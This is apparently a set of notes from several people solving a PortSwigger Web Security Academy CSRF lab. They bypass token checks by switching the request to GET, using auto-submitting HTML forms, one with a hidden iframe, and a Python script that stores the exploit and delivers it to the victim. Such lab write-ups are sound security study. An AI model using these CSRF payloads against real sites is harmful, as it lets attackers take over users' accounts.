This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

---

**Goal:** use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

**Analysis:**
_Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used._

_In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:_

```php
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

I can change the exploit from earlier to a GET request:
`method="POST"` to `method="GET"`

template:
```html
<html> 
	<body>
		<form method="POST" action="https://0a13000b045ad9b380ef266700c5009c.web-security-academy.net/my-account/change-email">
		    <input type="hidden" name="email" value="tester123@gmail.com">
		</form>
		<script>
	        document.forms[0].submit();
		</script>
	<body>
<html> 
```

exploit:
```html
<html> 
	<body>
		<form method="GET" action="https://0aa6009c04b45874c4c456d500d5003d.web-security-academy.net/my-account/change-email">
		    <input type="hidden" name="email" value="tester123@gmail.com">
		</form>
		<script>
	        document.forms[0].submit();
		</script>
	<body>
<html> 
```

I'll store the script and do the same thing as i did last lab:

1. Save exploit in the body of the exploit server.
2. Try changing my own email to test the code.
3. Change email and then deliver to the victim to complete the lab.

The exploit works changing my user accounts email so i'll deliver the  exploit and complete the lab.

Update:

```html
<html> 
	<body>
	<script>history.pushState('', '', '/')</script>
        <h1> Hello! </h1>
		<form method="GET" action="https://0aa6009c04b45874c4c456d500d5003d.web-security-academy.net/my-account/change-email">
		    <input type="hidden" name="email" value="tester1234@gmail.com">
            <input type="hidden" name="csrf" value="1234">
            <input type="submit" value="submit request" />
		</form>
		<script>
	        document.forms[0].submit();
		</script>
	<body>
<html> 
```

Rana 

```html
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-acee1f521e65f40d80e4b992006a0005.web-security-academy.net/my-account/change-email/" method="get" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

I can change my own email, but when i send it to the victim the lab doesn't complete. Maybe a problem with the lab?

---

```python
#!/usr/bin/env python3
# Lab: CSRF where token validation depends on request method
# Lab-Link: https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_exploitserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    try:
        result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    except TypeError:
        return None
    return result


def store_exploit(client, exploit_server, host):
    data = {'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': '''HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8''',
            'responseBody': '''<form action="''' + host + '''/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="email&#64;evil&#46;me" />
      <input type="submit" value="Submit request" />
</form>
<script>
    document.forms[0].submit();
</script>''',
            'formAction': 'STORE'}

    return client.post(exploit_server, data=data).status_code == 200


def main():
    print('[+] Lab: CSRF where token validation depends on request method')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    exploit_server = find_exploitserver(client.get(host).text)
    if exploit_server is None:
        print(f'[-] Failed to find exploit server')
        sys.exit(-2)
    print(f'[+] Exploit server: {exploit_server}')

    if not store_exploit(client, exploit_server, host):
        print(f'[-] Failed to store exploit file')
        sys.exit(-3)
    print(f'[+] Stored exploit file')

    if client.get(f'{exploit_server}/deliver-to-victim', allow_redirects=False).status_code != 302:
        print(f'[-] Failed to deliver exploit to victim')
        sys.exit(-4)
    print(f'[+] Delivered exploit to victim')

    if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
        print(f'[-] Failed to solve lab')
        sys.exit(-9)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
```

This one worked for me, but i have no idea why, and i don't think i did anything different. 

```html
<form action="https://0ad1002e031b434d84279a370093003f.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anythingelse@0web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

